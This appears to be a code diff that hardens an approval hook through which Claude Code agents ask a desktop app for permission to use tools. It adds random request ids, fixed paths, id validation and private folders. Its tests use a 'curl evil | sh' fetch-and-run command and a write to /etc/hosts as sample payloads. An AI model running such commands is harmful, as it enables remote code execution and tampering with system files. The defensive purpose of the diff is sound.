@@ -1,5 +1,5 @@
-//! Agent permission modes (`Skip` vs `Ask`), session hook generators, file-backed
-//! approval bridge (`<session_dir>/approvals/`), and unfocused-window OS notifications (`#656`).
+//! Agent permission modes (`Skip` vs `Ask`), session hook generators, the file-backed approval bridge (requests and
+//! answers in the Studio-private folder of [`crate::agent_approval_channel`]), and unfocused-window OS notifications (`#656`).
 
 use crate::comments::settings;
 use crate::terminal::{AgentCliPreset, PermissionMode};
@@ -103,23 +103,44 @@ pub fn build_resume_command_for_mode(
     })
 }
 
-/// Generates the POSIX `sh` script written to `<session_dir>/approve-hook.sh` for Claude Code's
-/// `PermissionRequest` hook in `Ask` mode.
-pub fn approval_hook_script(session_dir: &Path) -> String {
-    let session_dir_escaped = session_dir.display().to_string().replace('\'', "'\\''");
+/// Generates the POSIX `sh` script Studio installs in the session's private channel folder
+/// ([`crate::agent_approval_channel`]) for Claude Code's `PermissionRequest` hook in `Ask` mode.
+///
+/// The folder it answers from and the session folder it reports status to are written into the script itself.
+/// The environment may only name the tab (digits, checked) and shorten the wait; it never names a path, so a
+/// variable an agent managed to set cannot point the hook at a folder the agent can write. Request ids are 128 bits
+/// from `/dev/urandom`.
+pub fn approval_hook_script(channel_dir: &Path, session_dir: &Path) -> String {
+    let quote = |p: &Path| p.display().to_string().replace('\'', "'\\''");
+    let channel_dir_escaped = quote(channel_dir);
+    let session_dir_escaped = quote(session_dir);
     format!(
         r#"#!/bin/sh
 set -eu
+umask 077
 
-DEFAULT_SESSION_DIR='{session_dir_escaped}'
-SESSION_DIR="${{DESIGNOS_SESSION_DIR:-$DEFAULT_SESSION_DIR}}"
-APPROVALS_DIR="${{DESIGNOS_APPROVALS_DIR:-$SESSION_DIR/approvals}}"
-STATUS_FILE="$SESSION_DIR/agent-status.json"
+CHANNEL_DIR='{channel_dir_escaped}'
+STATUS_FILE='{session_dir_escaped}/agent-status.json'
 
-mkdir -p "$APPROVALS_DIR"
+# Declining prints nothing, so Claude asks in its own terminal prompt. Drain stdin first so Claude's write to this
+# hook never meets a closed pipe.
+decline() {{
+    cat > /dev/null 2>&1 || true
+    exit 0
+}}
+
+case "${{DESIGNOS_TAB_ID:-}}" in
+    ''|*[!0-9]*) decline ;;
+esac
+APPROVALS_DIR="$CHANNEL_DIR/tab-$DESIGNOS_TAB_ID"
+mkdir -p "$APPROVALS_DIR" || decline
 printf '{{"state":"waiting"}}\n' > "$STATUS_FILE" 2>/dev/null || true
 
-REQ_ID="${{DESIGNOS_APPROVAL_REQUEST_ID:-req-$$-$(date +%s)}}"
+REQ_ID="$(od -An -N16 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n' || true)"
+case "$REQ_ID" in
+    ''|*[!0-9a-f]*) decline ;;
+esac
+[ "${{#REQ_ID}}" -eq 32 ] || decline
 REQ_TMP="$APPROVALS_DIR/$REQ_ID.request.tmp"
 REQ_FILE="$APPROVALS_DIR/$REQ_ID.request.json"
 ANS_FILE="$APPROVALS_DIR/$REQ_ID.answer"
@@ -192,6 +213,9 @@ END {{
 mv -f "$REQ_TMP" "$REQ_FILE"
 
 TIMEOUT_MS="${{DESIGNOS_APPROVAL_TIMEOUT_MS:-300000}}"
+case "$TIMEOUT_MS" in
+    ''|*[!0-9]*) TIMEOUT_MS=300000 ;;
+esac
 ELAPSED_MS=0
 while [ "$ELAPSED_MS" -lt "$TIMEOUT_MS" ]; do
     if [ -f "$ANS_FILE" ]; then
@@ -211,6 +235,8 @@ while [ "$ELAPSED_MS" -lt "$TIMEOUT_MS" ]; do
                 ;;
         esac
     fi
+    # Studio removes the request when its tab closes or the request goes stale: nothing was approved.
+    [ -f "$REQ_FILE" ] || exit 0
     sleep 0.1
     ELAPSED_MS=$((ELAPSED_MS + 100))
 done
@@ -220,22 +246,25 @@ exit 0
     )
 }
 
-/// Writes `<session_dir>/approve-hook.sh` and marks it executable on Unix.
-pub fn write_approval_hook_script(session_dir: &Path) -> PathBuf {
-    let _ = std::fs::create_dir_all(session_dir);
-    let script_path = session_dir.join("approve-hook.sh");
-    let content = approval_hook_script(session_dir);
-    let _ = designos_library::write_atomic(&script_path, content.as_bytes());
+/// Installs `approve-hook.sh` in `session_dir`'s private channel folder ([`crate::agent_approval_channel`]) and returns
+/// its path. Fails, leaving the hook uninstalled, when the platform has no private data folder or the folder cannot be
+/// made private; Claude then asks in its own terminal prompt.
+pub fn write_approval_hook_script(session_dir: &Path) -> std::io::Result<PathBuf> {
+    let channel_dir = crate::agent_approval_channel::prepare_channel_dir(session_dir)?;
+    install_hook_script(&channel_dir, session_dir)
+}
+
+/// Writes `<channel_dir>/approve-hook.sh` (owner-only on Unix) for the agent working in `session_dir`.
+fn install_hook_script(channel_dir: &Path, session_dir: &Path) -> std::io::Result<PathBuf> {
+    let script_path = channel_dir.join(crate::agent_approval_channel::HOOK_SCRIPT_NAME);
+    let content = approval_hook_script(channel_dir, session_dir);
+    designos_library::write_atomic(&script_path, content.as_bytes()).map_err(|e| std::io::Error::other(e.to_string()))?;
     #[cfg(unix)]
     {
         use std::os::unix::fs::PermissionsExt;
-        if let Ok(meta) = std::fs::metadata(&script_path) {
-            let mut perms = meta.permissions();
-            perms.set_mode(0o755);
-            let _ = std::fs::set_permissions(&script_path, perms);
-        }
+        std::fs::set_permissions(&script_path, std::fs::Permissions::from_mode(0o700))?;
     }
-    script_path
+    Ok(script_path)
 }
 
 /// Handler appended to Claude's `PermissionRequest` hook group in `Ask` mode: runs `approve-hook.sh`, which blocks up
@@ -251,7 +280,7 @@ pub fn approval_hook_handler(script_path: &Path) -> serde_json::Value {
     })
 }
 
-/// One pending tool-approval request in `<session_dir>/approvals/<id>.request.json`.
+/// One pending tool-approval request in `<tab approvals folder>/<id>.request.json`.
 #[derive(Clone, Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
 pub struct ApprovalRequest {
     pub id: String,
@@ -261,36 +290,7 @@ pub struct ApprovalRequest {
     pub timestamp: u64,
 }
 
-/// Returns `<session_dir>/approvals`.
-pub fn approvals_dir(session_dir: &Path) -> PathBuf {
-    session_dir.join("approvals")
-}
-
-/// Returns the per-tab approvals directory `<session_dir>/approvals/tab-<tab_id>` (`#656`).
-pub fn tab_approvals_dir(session_dir: &Path, tab_id: usize) -> PathBuf {
-    approvals_dir(session_dir).join(format!("tab-{tab_id}"))
-}
-
-/// Returns `<session_dir>/approve-hook.sh`.
-pub fn approval_hook_script_path(session_dir: &Path) -> PathBuf {
-    session_dir.join("approve-hook.sh")
-}
-
-/// Cleans up stale approval requests older than [`APPROVAL_HOOK_TIMEOUT_SECS`].
-pub fn cleanup_stale_approvals(session_dir: &Path, now_secs: u64) {
-    let root = approvals_dir(session_dir);
-    let _ = poll_approvals_in_dir(&root, now_secs, APPROVAL_HOOK_TIMEOUT_SECS);
-    if let Ok(entries) = std::fs::read_dir(&root) {
-        for entry in entries.flatten() {
-            let p = entry.path();
-            if p.is_dir() {
-                let _ = poll_approvals_in_dir(&p, now_secs, APPROVAL_HOOK_TIMEOUT_SECS);
-            }
-        }
-    }
-}
-
-/// Decision written by Studio to `<session_dir>/approvals/<id>.answer`.
+/// Decision written by Studio to `<tab approvals folder>/<id>.answer`.
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum ApprovalDecision {
     Allow,
@@ -324,6 +324,12 @@ pub fn summarize_tool_input(tool_name: &str, tool_input: &serde_json::Value) -> 
     fallback.chars().take(MAX_INPUT_SUMMARY_CHARS).collect()
 }
 
+/// A request id names the `<id>.answer` file Studio writes, so it must be a plain file stem: the hook makes 32 hex
+/// digits, and nothing else (a `/`, a `..`, an empty or very long name) is ever answered.
+fn is_valid_request_id(id: &str) -> bool {
+    !id.is_empty() && id.len() <= 64 && id.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
+}
+
 /// Polls `<approvals_dir>/*.request.json`, cleaning up any stale request files older than
 /// `timeout_secs` and returning active requests ordered oldest-first.
 pub fn poll_approvals_in_dir(approvals_dir: &Path, now_secs: u64, timeout_secs: u64) -> Vec<ApprovalRequest> {
@@ -346,6 +352,9 @@ pub fn poll_approvals_in_dir(approvals_dir: &Path, now_secs: u64, timeout_secs: 
         let Ok(mut req) = serde_json::from_str::<ApprovalRequest>(&raw) else {
             continue;
         };
+        if !is_valid_request_id(&req.id) {
+            continue;
+        }
         let ans = approvals_dir.join(format!("{}.answer", req.id));
         if req.timestamp > 0 && now_secs.saturating_sub(req.timestamp) > timeout_secs {
             let _ = std::fs::remove_file(&path);
@@ -364,22 +373,15 @@ pub fn poll_approvals_in_dir(approvals_dir: &Path, now_secs: u64, timeout_secs: 
     requests
 }
 
-/// Polls `<session_dir>/approvals/*.request.json`, cleaning up any stale request files older than
-/// `timeout_secs` and returning active requests ordered oldest-first.
-pub fn poll_approvals_dir(session_dir: &Path, now_secs: u64, timeout_secs: u64) -> Vec<ApprovalRequest> {
-    poll_approvals_in_dir(&approvals_dir(session_dir), now_secs, timeout_secs)
-}
-
-/// Writes `<approvals_dir>/<id>.answer` (`allow`, `deny`, or `withdrawn`).
+/// Writes `<approvals_dir>/<id>.answer` (`allow`, `deny`, or `withdrawn`). `id` must be a request id as
+/// [`poll_approvals_in_dir`] returns it; any other name is refused.
 pub fn write_approval_answer_in_dir(approvals_dir: &Path, id: &str, decision: ApprovalDecision) -> std::io::Result<()> {
-    std::fs::create_dir_all(approvals_dir)?;
+    if !is_valid_request_id(id) {
+        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, format!("`{id}` is not a request id")));
+    }
+    crate::agent_approval_channel::create_private_dir_all(approvals_dir)?;
     let ans_path = approvals_dir.join(format!("{id}.answer"));
     designos_library::write_atomic(&ans_path, decision.as_str().as_bytes()).map_err(|e| std::io::Error::other(e.to_string()))
-}
-
-/// Writes `<session_dir>/approvals/<id>.answer` (`allow`, `deny`, or `withdrawn`).
-pub fn write_approval_answer(session_dir: &Path, id: &str, decision: ApprovalDecision) -> std::io::Result<()> {
-    write_approval_answer_in_dir(&approvals_dir(session_dir), id, decision)
 }
 
 /// Writes `withdrawn` to `<id>.answer` for every pending `<id>.request.json` in `approvals_dir`.
@@ -394,21 +396,6 @@ pub fn withdraw_pending_requests_in_dir(approvals_dir: &Path) {
         };
         if let Some(id) = name.strip_suffix(".request.json") {
             let _ = write_approval_answer_in_dir(approvals_dir, id, ApprovalDecision::Withdrawn);
-        }
-    }
-}
-
-/// Writes `withdrawn` to `<id>.answer` for every pending `<id>.request.json` in `<session_dir>/approvals/`
-/// (and any `tab-*` subdirectories).
-pub fn withdraw_pending_requests(session_dir: &Path) {
-    let root = approvals_dir(session_dir);
-    withdraw_pending_requests_in_dir(&root);
-    if let Ok(entries) = std::fs::read_dir(&root) {
-        for entry in entries.flatten() {
-            let p = entry.path();
-            if p.is_dir() {
-                withdraw_pending_requests_in_dir(&p);
-            }
         }
     }
 }
@@ -509,10 +496,9 @@ impl NotificationLatch {
 
 #[cfg(test)]
 mod tests {
+    use super::approval_channel_tests::{bash_payload, decision_of, wait_for_request, Fixture};
     use super::*;
     use crate::terminal::AgentCliPreset;
-    use std::io::Write;
-    use std::process::{Command, Stdio};
 
     #[test]
     fn default_mode_is_ask() {
@@ -651,98 +637,49 @@ mod tests {
 
     #[test]
     fn hook_script_allow_prints_the_documented_decision() {
-        let tmp = std::env::temp_dir().join(format!("designos-656-hook-allow-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&tmp);
-        std::fs::create_dir_all(&tmp).unwrap();
-        let script = write_approval_hook_script(&tmp);
-
-        let mut child = Command::new("sh").arg(&script).stdin(Stdio::piped()).stdout(Stdio::piped()).spawn().expect("spawn sh approve-hook.sh");
-        let payload = serde_json::json!({
-            "hook_event_name": "PermissionRequest",
-            "tool_name": "Bash",
-            "tool_input": { "command": "cargo test -p designos-app" }
-        });
-        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();
-
-        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
-        let req_id = loop {
-            let reqs = poll_approvals_dir(&tmp, crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS);
-            if let Some(first) = reqs.first() {
-                break first.id.clone();
-            }
-            assert!(std::time::Instant::now() < deadline, "Timed out waiting for request file");
-            std::thread::sleep(std::time::Duration::from_millis(25));
-        };
-        write_approval_answer(&tmp, &req_id, ApprovalDecision::Allow).unwrap();
+        let fx = Fixture::new("allow");
+        let child = fx.start(10_000, &bash_payload("cargo test -p designos-app"));
+        let req = wait_for_request(&fx.tab_dir);
+        assert_eq!((req.tool_name.as_str(), req.input_summary.as_str()), ("Bash", "cargo test -p designos-app"));
+        write_approval_answer_in_dir(&fx.tab_dir, &req.id, ApprovalDecision::Allow).unwrap();
 
         let out = child.wait_with_output().unwrap();
         assert!(out.status.success());
-        let parsed: serde_json::Value = serde_json::from_slice(&out.stdout).expect("valid JSON decision");
+        let parsed = decision_of(&out.stdout);
         assert_eq!(parsed["hookSpecificOutput"]["hookEventName"], "PermissionRequest");
         assert_eq!(parsed["hookSpecificOutput"]["decision"]["behavior"], "allow");
-        let _ = std::fs::remove_dir_all(&tmp);
+        assert!(
+            poll_approvals_in_dir(&fx.tab_dir, crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS).is_empty(),
+            "an answered request is gone"
+        );
     }
 
     #[test]
     fn hook_script_deny_carries_a_message() {
-        let tmp = std::env::temp_dir().join(format!("designos-656-hook-deny-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&tmp);
-        std::fs::create_dir_all(&tmp).unwrap();
-        let script = write_approval_hook_script(&tmp);
-
-        let mut child = Command::new("sh").arg(&script).stdin(Stdio::piped()).stdout(Stdio::piped()).spawn().expect("spawn sh approve-hook.sh");
+        let fx = Fixture::new("deny");
         let payload = serde_json::json!({
             "hook_event_name": "PermissionRequest",
             "tool_name": "Write",
             "tool_input": { "file_path": "/etc/hosts", "content": "secret" }
         });
-        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();
-
-        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
-        let req_id = loop {
-            let reqs = poll_approvals_dir(&tmp, crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS);
-            if let Some(first) = reqs.first() {
-                break first.id.clone();
-            }
-            assert!(std::time::Instant::now() < deadline, "Timed out waiting for request file");
-            std::thread::sleep(std::time::Duration::from_millis(25));
-        };
-        write_approval_answer(&tmp, &req_id, ApprovalDecision::Deny).unwrap();
+        let child = fx.start(10_000, &payload);
+        let req = wait_for_request(&fx.tab_dir);
+        write_approval_answer_in_dir(&fx.tab_dir, &req.id, ApprovalDecision::Deny).unwrap();
 
         let out = child.wait_with_output().unwrap();
         assert!(out.status.success());
-        let parsed: serde_json::Value = serde_json::from_slice(&out.stdout).expect("valid JSON decision");
+        let parsed = decision_of(&out.stdout);
         assert_eq!(parsed["hookSpecificOutput"]["hookEventName"], "PermissionRequest");
         assert_eq!(parsed["hookSpecificOutput"]["decision"]["behavior"], "deny");
         assert!(!parsed["hookSpecificOutput"]["decision"]["message"].as_str().unwrap_or_default().is_empty());
-        let _ = std::fs::remove_dir_all(&tmp);
     }
 
     #[test]
     fn hook_script_timeout_prints_nothing() {
-        let tmp = std::env::temp_dir().join(format!("designos-656-hook-timeout-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&tmp);
-        std::fs::create_dir_all(&tmp).unwrap();
-        let script = write_approval_hook_script(&tmp);
-
-        let mut child = Command::new("sh")
-            .arg(&script)
-            .env("DESIGNOS_APPROVAL_TIMEOUT_MS", "300")
-            .stdin(Stdio::piped())
-            .stdout(Stdio::piped())
-            .spawn()
-            .expect("spawn sh approve-hook.sh");
-        let payload = serde_json::json!({
-            "hook_event_name": "PermissionRequest",
-            "tool_name": "Bash",
-            "tool_input": { "command": "echo hi" }
-        });
-        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();
-
-        let out = child.wait_with_output().unwrap();
+        let fx = Fixture::new("timeout");
+        let out = fx.start(300, &bash_payload("echo hi")).wait_with_output().unwrap();
         assert!(out.status.success());
         assert!(out.stdout.is_empty(), "Timeout must print nothing to stdout: {:?}", String::from_utf8_lossy(&out.stdout));
-        let _ = std::fs::remove_dir_all(&tmp);
     }
 
     #[test]
@@ -758,88 +695,39 @@ mod tests {
         assert!(!summary.contains("SUPER_SECRET"));
 
         // Also verify the POSIX awk script in approve-hook.sh writes a 200-char summary to .request.json
-        let tmp = std::env::temp_dir().join(format!("designos-656-hook-summary-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&tmp);
-        std::fs::create_dir_all(&tmp).unwrap();
-        let script = write_approval_hook_script(&tmp);
-        let mut child = Command::new("sh")
-            .arg(&script)
-            .env("DESIGNOS_APPROVAL_TIMEOUT_MS", "200")
-            .stdin(Stdio::piped())
-            .stdout(Stdio::piped())
-            .spawn()
-            .expect("spawn sh approve-hook.sh");
-        let payload = serde_json::json!({
-            "hook_event_name": "PermissionRequest",
-            "tool_name": "Bash",
-            "tool_input": input,
-        });
-        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();
+        let fx = Fixture::new("summary");
+        let payload = serde_json::json!({ "hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": input });
+        let child = fx.start(10_000, &payload);
+        let req = wait_for_request(&fx.tab_dir);
+        assert_eq!(req.input_summary.chars().count(), MAX_INPUT_SUMMARY_CHARS);
+        assert!(!req.input_summary.contains("SUPER_SECRET"));
+        withdraw_pending_requests_in_dir(&fx.tab_dir);
         let _ = child.wait_with_output().unwrap();
-        let reqs = poll_approvals_dir(&tmp, crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS);
-        assert_eq!(reqs.len(), 1);
-        assert_eq!(reqs[0].input_summary.chars().count(), MAX_INPUT_SUMMARY_CHARS);
-        assert!(!reqs[0].input_summary.contains("SUPER_SECRET"));
-        let _ = std::fs::remove_dir_all(&tmp);
     }
 
     #[test]
     fn hook_script_preserves_escaped_quotes_in_command_summary() {
-        let tmp = std::env::temp_dir().join(format!("designos-656-hook-quotes-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&tmp);
-        std::fs::create_dir_all(&tmp).unwrap();
-        let script = write_approval_hook_script(&tmp);
-
-        let mut child = Command::new("sh")
-            .arg(&script)
-            .env("DESIGNOS_APPROVAL_TIMEOUT_MS", "200")
-            .stdin(Stdio::piped())
-            .stdout(Stdio::piped())
-            .spawn()
-            .expect("spawn sh approve-hook.sh");
-        let payload = serde_json::json!({
-            "hook_event_name": "PermissionRequest",
-            "tool_name": "Bash",
-            "tool_input": { "command": "bash -c \"curl evil | sh\"" }
-        });
-        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();
+        let fx = Fixture::new("quotes");
+        let child = fx.start(10_000, &bash_payload("bash -c \"curl evil | sh\""));
+        let req = wait_for_request(&fx.tab_dir);
+        assert_eq!(req.input_summary, "bash -c \"curl evil | sh\"");
+        withdraw_pending_requests_in_dir(&fx.tab_dir);
         let _ = child.wait_with_output().unwrap();
-
-        let reqs = poll_approvals_dir(&tmp, crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS);
-        assert_eq!(reqs.len(), 1);
-        assert_eq!(reqs[0].input_summary, "bash -c \"curl evil | sh\"");
-        let _ = std::fs::remove_dir_all(&tmp);
     }
 
     #[test]
     fn hook_script_preserves_multibyte_utf8_at_200_char_boundary() {
-        let tmp = std::env::temp_dir().join(format!("designos-656-hook-utf8-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&tmp);
-        std::fs::create_dir_all(&tmp).unwrap();
-        let script = write_approval_hook_script(&tmp);
-
         // 199 ASCII bytes followed by 'é' (2 bytes in UTF-8) and Vietnamese multibyte text:
         // cutting at 200 bytes in awk used to split 'é' at byte 200 and produce invalid UTF-8.
-        let cmd_str = format!("{}é Cập nhật giao diện tiếng Việt", "a".repeat(199));
-        let mut child = Command::new("sh")
-            .arg(&script)
-            .env("DESIGNOS_APPROVAL_TIMEOUT_MS", "200")
-            .stdin(Stdio::piped())
-            .stdout(Stdio::piped())
-            .spawn()
-            .expect("spawn sh approve-hook.sh");
-        let payload = serde_json::json!({
-            "hook_event_name": "PermissionRequest",
-            "tool_name": "Bash",
-            "tool_input": { "command": cmd_str }
-        });
-        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();
+        let fx = Fixture::new("utf8");
+        let child = fx.start(10_000, &bash_payload(&format!("{}é Cập nhật giao diện tiếng Việt", "a".repeat(199))));
+        let req = wait_for_request(&fx.tab_dir);
+        assert_eq!(req.input_summary.chars().count(), MAX_INPUT_SUMMARY_CHARS, "Request with multibyte UTF-8 at byte 200 must be polled");
+        assert!(req.input_summary.ends_with('é'), "200th character must be 'é': {}", req.input_summary);
+        withdraw_pending_requests_in_dir(&fx.tab_dir);
         let _ = child.wait_with_output().unwrap();
-
-        let reqs = poll_approvals_in_dir(&approvals_dir(&tmp), crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS);
-        assert_eq!(reqs.len(), 1, "Request with multibyte UTF-8 at byte 200 must be polled");
-        assert_eq!(reqs[0].input_summary.chars().count(), MAX_INPUT_SUMMARY_CHARS);
-        assert!(reqs[0].input_summary.ends_with('é'), "200th character must be 'é': {}", reqs[0].input_summary);
-        let _ = std::fs::remove_dir_all(&tmp);
     }
 }
+
+#[cfg(test)]
+mod approval_channel_tests;
